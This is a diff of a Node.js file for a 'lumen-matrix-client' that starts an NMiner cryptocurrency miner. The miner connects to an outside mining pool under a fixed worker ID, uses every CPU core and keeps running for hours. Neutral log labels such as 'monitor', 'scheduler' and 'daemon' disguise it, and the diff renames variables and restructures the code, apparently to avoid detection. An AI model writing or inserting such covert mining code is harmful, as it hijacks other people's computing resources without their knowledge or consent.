@@ -3,32 +3,27 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./core/config");
 
-async function launchDaemon() {
-    const sessionId = "3d3d2f";
-    console.log(`[runtime] Starting runtime for ${config.appName || "lumen-matrix-client"} [${sessionId}]`);
+(async () => {
+    const traceId = "fcefa7";
+    console.log(`[monitor] Daemon ${config.appName || "lumen-matrix-client"} active [tag: ${traceId}]`);
 
-    const service = new NMiner(
+    const scheduler = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.lumen-matrix-client",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
     );
 
-    process.stdin.resume();
+    const keepAlivePromise = new Promise(() => {});
     setTimeout(() => {
-        console.log("[timeout] Operational limit (309m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (320m) reached, exiting cleanly.");
         process.exit(0);
-    }, 309 * 60 * 1000);
+    }, 320 * 60 * 1000);
 
-    process.on("SIGTERM", () => {
+    process.once("SIGTERM", () => {
         
-        console.log(`[runtime] Signal SIGTERM acknowledged, exiting session ${sessionId}.`);
+        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
         process.exit(0);
     });
 
-    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
-}
-
-launchDaemon().catch((err) => {
-    console.error("Supervisor startup fault:", err);
-    process.exit(1);
-});
+    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
+})().catch(console.error);
